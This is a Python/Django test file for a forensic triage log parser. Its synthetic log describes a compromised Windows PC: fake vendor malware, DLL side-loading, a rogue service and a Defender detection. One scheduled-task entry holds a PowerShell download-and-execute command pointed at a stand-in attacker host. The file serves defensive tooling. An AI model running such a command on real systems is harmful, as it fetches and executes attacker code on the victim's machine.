"""Links within a Spor log that 0.8.0 logs of November 2026 showed missing
(correlations/spor_self.py, spor_source.py, spor_log.py): SUMMARY findings
that name their file in free text ("service installed: X: C:\\Program Files
(x86)\\..."), Defender resources as volume devices, Autodetect lines about an
installed program, task events without a file, a task named like the folder
of the program it starts, notes in brackets after a USB path, a task's further
actions, and Windows binaries that are not host programs."""

from django.test import SimpleTestCase

from .. import spor_log
from ..correlation_keys import is_host_program, is_windows_binary
from ..correlations.spor_self import compute, self_links, self_status

ROAMING = 'C:\\Users\\Ann  Lee\\AppData\\Roaming'
LOCAL = 'C:\\Users\\Ann  Lee\\AppData\\Local'
BROTHER = 'C:\\Program Files (x86)\\Brother\\iPrint&Scan\\WorkflowAppControl\\WorkflowAppControl.exe'
PRN = 'C:\\ProgramData\\prndata..\\prn.exe'
STEAM_DLL = 'C:\\Games\\Kingdom Come - Deliverance\\Bin\\Win64Shared\\steam_api64.dll'
SIDE_DLL = ROAMING + '\\uTorrent Web\\avformat-58.dll'
SIDE_HOST = ROAMING + '\\uTorrent Web\\utweb.exe'
VIA = LOCAL + '\\VIA\\VIA Chrome Runtime\\MSBuild.exe'
NODE = 'C:\\Windows\\System32\\HealthCheckerV1-abcdef\\node.exe'
TASK = '\\Microsoft\\Windows\\Guard\\HealthCheckerV1-abcdef'
DISCORD = LOCAL + '\\Discord\\app-1.0.9269\\Discord.exe'
MEDIA = "N:\\Output\\<U+0020>Dawn of Justice (featurette) ().mp4"
NOTE = '[name ends with a space or dot: Windows programs cannot open it]'
ACTION = 'C:\\ProgramData\\Upd\\second.exe'
GUID = '7EA37920-9BEE-44E1-AED3-41336D866B77'

SPOR = '\n'.join([
    '==================== Spor 0.8.0 - forensic triage log ==============================================',
    'Created:   2026-11-24 20:31:59 UTC (local time 03:31, UTC+07:00)',
    'Users:     Ann  Lee',
    'Times:     UTC, except created and modified in FILES (local time of this PC, as FRST shows them)',
    '',
    '==================== SUMMARY - flagged items; details in the sections below ========================',
    '(line: time [from] item [status] => details <==== flags)',
    '',
    f'2025-10-16 01:27:51 [Persistence] service WorkflowAppControl (auto): {BROTHER} [unsigned]',
    f'2026-11-22 15:57:33 [Persistence] service installed: OneSyncTask: \\\\?\\{PRN}',
    f'2026-04-17 06:48:18 [Persistence] DLL side-loading: {SIDE_DLL} (unsigned) imported by {SIDE_HOST} (signed by BitTorrent)',
    f'2026-06-25 21:04:18 [Execution evidence] {VIA} [gone] => ShimCache: file modified <==== !lolbin !lolbin-copy',
    f'2026-11-01 08:33:37 [Autodetect] installed program VIA Chrome Runtime 3.8 (VIA Technologies Inc.), key HKLM-x32\\...\\{{{GUID}}}'
    ' => RenLoader: fake hardware-vendor program (version d.d) <==== !known-malware',
    '2026-11-01 08:33:40 [Defender] Defender detected: Trojan:MSIL/Heracles.ARA!MTB => process ' + VIA,
    '    resource: \\Device\\HarddiskVolume3\\Users\\Ann  Lee\\AppData\\Local\\VIA\\VIA Chrome Runtime\\MSBuild.exe',
    f'2025-10-27 19:41:17 [USB drives] {MEDIA} => attributes archive <==== !invisible-char',
    f'[Signature] invalid signature: {STEAM_DLL} (file changed after signing (bad digest), signer Valve Corp.)',
    '',
    '==================== TIMELINE - last 30 days, oldest first =========================================',
    '(line: time [sources] file or event [status] => details <==== flags)',
    '',
    '2026-11-01 08:33:37 [INS] installed or updated: VIA Chrome Runtime 3.8 (VIA Technologies Inc.)',
    f'    key: HKLM-x32\\...\\{{{GUID}}}',
    '2026-11-01 08:33:40 [DEF] Defender detected: Trojan:MSIL/Heracles.ARA!MTB => process ' + VIA,
    '    resource: \\Device\\HarddiskVolume3\\Users\\Ann  Lee\\AppData\\Local\\VIA\\VIA Chrome Runtime\\MSBuild.exe',
    f'2026-11-10 09:00:58 [TSK] task {TASK} changed',
    f'2026-11-22 15:57:33 [SVC] {PRN} => service OneSyncTask installed',
    '',
    '==================== SOFTWARE - programs installed, updated or removed recently ====================',
    '--- Installed programs (Uninstall keys) ---',
    '',
    '2026-11-01 08:33:37 [machine 32-bit] VIA Chrome Runtime => Windows Installer (msiexec), version 3.8; publisher VIA Technologies Inc.',
    f'    key: HKLM-x32\\...\\{{{GUID}}}',
    '',
    '--- Windows Installer: installs and removals in the last 30 days (Application log) ---',
    '',
    f'2026-11-01 08:33:37 [1033] installed: VIA Chrome Runtime 3.8 (VIA Technologies Inc.) => Ann; name VIA Chrome Runtime; product code {{{GUID}}}',
    '',
    '==================== PERSISTENCE - Run keys, services, scheduled tasks, Startup folders, WMI, with times ====',
    '--- Run keys (all entries) ---',
    '',
    '2026-11-24 20:12:31 [run] HKU\\Ann\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Discord',
    f'    program: {DISCORD}',
    '',
    '--- Services and drivers ---',
    '',
    f'2025-10-16 01:27:51 [service] WorkflowAppControl => {BROTHER} [unsigned], start auto',
    f'2026-11-22 15:57:33 [service] OneSyncTask => \\\\?\\{PRN}, start auto',
    f'2026-04-17 06:48:18 [run] HKU\\Ann\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\utweb',
    f'    program: {SIDE_HOST}',
    f'    module: {SIDE_DLL} [unsigned] => loaded by utweb.exe',
    '',
    '--- Scheduled tasks ---',
    '',
    f'2026-05-18 16:10:01 [task] {TASK} => changed 2026-11-10 09:00:58',
    '    program: powershell',
    '    arguments: -nop -Command "& ([scriptblock]::Create((Invoke-RestMethod \'evil.example\')))"',
    f'    action: {ACTION} [unsigned] => arguments /run',
    '',
    '==================== RUNNING PROCESSES - programs running now ======================================',
    '',
    f'2026-11-24 08:19:25 [8728] {NODE} => parent powershell.exe (6484) < svchost.exe (1136)',
    '',
    '==================== EXECUTION EVIDENCE - ShimCache, BAM, PCA ======================================',
    '',
    f'2026-06-25 21:04:18 [SC] {VIA} [gone] => file modified <==== !lolbin !lolbin-copy',
    '',
    '==================== DEFENDER - detections, exclusions, settings ===================================',
    '',
    '2026-11-01 08:33:40 [1116] Defender detected: Trojan:MSIL/Heracles.ARA!MTB => process ' + VIA,
    '    resource: \\Device\\HarddiskVolume3\\Users\\Ann  Lee\\AppData\\Local\\VIA\\VIA Chrome Runtime\\MSBuild.exe',
    '',
    '==================== USB DRIVES - drives, autorun.inf, shortcuts ===================================',
    '',
    f'2025-10-27 19:41:17 {MEDIA} {NOTE} => attributes archive; created 2025-10-27 19:41 <==== !invisible-char',
    '',
    '==================== FILES - SHA256, signature and version of the files as they are on disk now ====',
    '',
    f'{BROTHER} => {"11" * 32}, signature unsigned',
    f'{STEAM_DLL} => {"22" * 32}, signature invalid; signer Valve Corp.; note file changed after signing (bad digest)',
    f'{SIDE_DLL} => {"33" * 32}, signature unsigned',
    f'{SIDE_HOST} => {"44" * 32}, signature valid; signer BitTorrent Inc',
    f'{NODE} => {"55" * 32}, signature valid; signer OpenJS Foundation',
    f'{DISCORD} => {"66" * 32}, signature valid; signer Discord Inc.',
    f'{ACTION} => {"77" * 32}, signature unsigned',
    '',
    '==================== LEGEND ========================================================================',
    '==================== End of log. Scan took 9.9 s ====',
])
LINES = SPOR.split('\n')


def no_of(prefix, start=0):
    """The number of the first line (after `start`) that starts with `prefix` (stripped)."""
    return next(no for no, text in enumerate(LINES, start=1) if no > start and text.strip().startswith(prefix))


def linked(links, no):
    """{other line no: match} of a line's links."""
    return {entry['line_no']: entry.get('match') for entry in links.get(str(no), ())}


def files_line(path):
    return no_of(path + ' => ', no_of('==================== FILES'))


class SummaryPathTests(SimpleTestCase):
    def setUp(self):
        self.links = self_links('spor', SPOR)

    def test_a_path_with_blanks_in_a_finding_links_its_file(self):
        summary = no_of('2025-10-16 01:27:51 [Persistence] service WorkflowAppControl')
        found = linked(self.links, summary)
        self.assertIn(files_line(BROTHER), found)
        self.assertIn(no_of('2025-10-16 01:27:51 [service]'), found)

    def test_a_device_prefixed_service_path_links_the_service(self):
        summary = no_of('2026-11-22 15:57:33 [Persistence] service installed')
        found = linked(self.links, summary)
        self.assertIn(no_of('2026-11-22 15:57:33 [service] OneSyncTask'), found)
        self.assertIn(no_of('2026-11-22 15:57:33 [SVC]'), found)

    def test_an_invalid_signature_finding_links_its_files_line(self):
        summary = no_of('[Signature] invalid signature')
        self.assertIn(files_line(STEAM_DLL), linked(self.links, summary))
        self.assertEqual(self_status(self.links[str(summary)]), '!')

    def test_a_side_loading_finding_links_the_dll(self):
        summary = no_of('2026-04-17 06:48:18 [Persistence] DLL side-loading')
        found = linked(self.links, summary)
        self.assertIn(files_line(SIDE_DLL), found)
        self.assertIn(no_of('module: ' + SIDE_DLL), found)

    def test_a_note_in_brackets_is_no_part_of_the_path(self):
        summary = no_of('2025-10-27 19:41:17 [USB drives]')
        section = no_of('2025-10-27 19:41:17 ' + MEDIA + ' [name')
        self.assertIn(section, linked(self.links, summary))
        item = spor_log.split_item(LINES[section - 1].strip())
        self.assertEqual(item.item, MEDIA)
        self.assertTrue(item.rest.startswith('name ends with a space or dot'))


class DefenderDeviceTests(SimpleTestCase):
    def test_volume_devices_map_to_the_drive_the_log_pairs_them_with(self):
        self.assertEqual(spor_log.device_volumes(LINES), {'harddiskvolume3': 'C:'})
        self.assertEqual(spor_log.device_path('\\Device\\HarddiskVolume3\\x\\a.exe', {'harddiskvolume3': 'D:'}), 'D:\\x\\a.exe')
        # Unpaired: the system drive for its own folders only.
        self.assertEqual(spor_log.device_path('\\Device\\HarddiskVolume9\\Users\\a.exe'), 'C:\\Users\\a.exe')
        self.assertEqual(spor_log.device_path('\\Device\\HarddiskVolume9\\Games\\a.exe'), '')
        self.assertEqual(spor_log.device_path('C:\\a.exe'), 'C:\\a.exe')

    def test_a_volume_paired_with_two_drives_is_left_out(self):
        lines = [
            'x => process C:\\a\\b.exe; \\Device\\HarddiskVolume2\\a\\b.exe',
            'y => process D:\\a\\b.exe',
        ]
        self.assertEqual(spor_log.device_volumes(lines), {})

    def test_a_detection_by_device_path_colours_the_files_other_lines(self):
        links = self_links('spor', SPOR)
        shim = no_of('2026-06-25 21:04:18 [SC]')
        summary = no_of('2026-06-25 21:04:18 [Execution evidence]')
        detected = no_of('2026-11-01 08:33:40 [1116]')
        self.assertIn(detected, linked(links, shim))
        self.assertEqual(self_status(links[str(shim)]), 'B')
        self.assertEqual(self_status(links[str(summary)]), 'B')
        paths = [path for _no, _threat, _action, path in spor_log.iter_defender_detections(LINES)]
        self.assertEqual(paths, [VIA])


class EntryKeyTests(SimpleTestCase):
    def setUp(self):
        self.links = self_links('spor', SPOR)

    def test_an_autodetect_program_links_its_software_lines(self):
        autodetect = no_of('2026-11-01 08:33:37 [Autodetect]')
        found = linked(self.links, autodetect)
        self.assertEqual(found[no_of('2026-11-01 08:33:37 [machine 32-bit]')], 'uninstall')
        self.assertIn(no_of('2026-11-01 08:33:37 [INS]'), found)
        self.assertIn(no_of('2026-11-01 08:33:37 [1033]'), found)

    def test_a_task_event_without_a_file_links_its_task(self):
        event = no_of('2026-11-10 09:00:58 [TSK]')
        task = no_of('2026-05-18 16:10:01 [task]')
        self.assertEqual(linked(self.links, event)[task], 'task')
        self.assertEqual(linked(self.links, task)[event], 'task')

    def test_a_task_runs_powershell_named_like_the_folder_of_a_program(self):
        task = no_of('2026-05-18 16:10:01 [task]')
        node = no_of(NODE + ' => ', no_of('==================== FILES'))
        self.assertEqual(linked(self.links, task)[node], 'named_like')
        self.assertEqual(linked(self.links, node)[task], 'named_like')
        # Informational: no status from it.
        self.assertEqual(self_status(self.links[str(task)]), '')

    def test_a_run_value_running_its_own_folders_program_is_not_named_like(self):
        run = no_of('2026-11-24 20:12:31 [run]')
        self.assertNotIn('named_like', linked(self.links, run).values())

    def test_a_tasks_further_action_is_a_mention_of_its_file(self):
        action = no_of('action: ' + ACTION)
        mentions = [mention for mention in spor_log.iter_mentions(LINES) if mention.line_no == action]
        self.assertEqual([(mention.path, mention.role) for mention in mentions], [(ACTION, 'action')])
        self.assertIn(files_line(ACTION), linked(self.links, action))


class HostProgramTests(SimpleTestCase):
    def test_only_binaries_directly_in_system32_are_windows_binaries(self):
        self.assertTrue(is_windows_binary('c:\\windows\\system32\\securityhealthsystray.exe'))
        self.assertTrue(is_windows_binary('c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\msbuild.exe'))
        self.assertFalse(is_windows_binary('c:\\windows\\system32\\healthcheck\\node.exe'))
        self.assertFalse(is_windows_binary('c:\\windows\\system32\\drivers\\kvckiller.sys'))
        self.assertFalse(is_windows_binary('c:\\windows\\system32\\evil.sys'))
        self.assertTrue(is_host_program('c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe'))
        self.assertFalse(is_host_program('c:\\windows\\system32\\healthcheck\\node.exe'))

    def test_a_program_in_a_system32_subfolder_links_as_a_file(self):
        links = self_links('spor', SPOR)
        node = no_of('2026-11-24 08:19:25 [8728]')
        files = no_of(NODE + ' => ', no_of('==================== FILES'))
        self.assertIsNone(linked(links, node)[files])

    def test_the_log_is_read_once_per_compute(self):
        # compute and self_links agree (one SporFacts per log).
        self.assertEqual(compute('spor', SPOR).as_dict(), self_links('spor', SPOR))
